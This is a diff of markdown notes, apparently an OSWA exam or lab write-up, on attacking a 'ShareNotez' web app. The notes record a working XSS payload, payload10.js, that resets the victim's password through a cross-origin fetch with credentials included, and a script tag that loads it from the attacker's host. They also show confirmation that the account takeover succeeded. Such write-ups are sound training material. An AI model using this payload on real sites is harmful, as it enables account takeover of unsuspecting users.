@@ -401,6 +401,8 @@ fetch("https://localhost:8443/api/me", {
   credentials: "include"
 }).then(r => r.json()).then(console.log);
 ```
+screenshot testing the 2 methods above 
+![[ss-20250919-OSWA-Exam-ShareNotez-pic17.png]]
 attempting to bypass prefetch error
 ```bash
 fetch("/api/me/password", {
@@ -412,3 +414,30 @@ fetch("/api/me/password", {
   credentials: "include"
 });
 ```
+not found, need to change to `8443` on `https`
+![[ss-20250919-OSWA-Exam-ShareNotez-pic18.png]]
+as found in the `app.js`
+![[ss-20250919-OSWA-Exam-ShareNotez-pic19.png]]
+`payload10.js`
+```js
+fetch("https://192.168.62.62:8443/api/me/password", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/x-www-form-urlencoded"
+  },
+  body: "password=adminxss",
+  credentials: "include"
+});
+```
+sending payload with 
+```bash
+<script src="http://192.168.49.62:8000/payload10.js"></script>
+```
+first `200` error looks like success
+![[ss-20250919-OSWA-Exam-ShareNotez-pic20.png]]
+tested new login credentials and was able to login with `test:adminxss` which are the credentials that the fetch changed
+![[ss-20250919-OSWA-Exam-ShareNotez-pic21.png]]
+what the whole `burp` request looks like after it works 
+![[ss-20250919-OSWA-Exam-ShareNotez-pic22.png]]
+reported the working `payload10.js` and now waiting to see if it gets executed
+![[ss-20250919-OSWA-Exam-ShareNotez-pic23.png]]
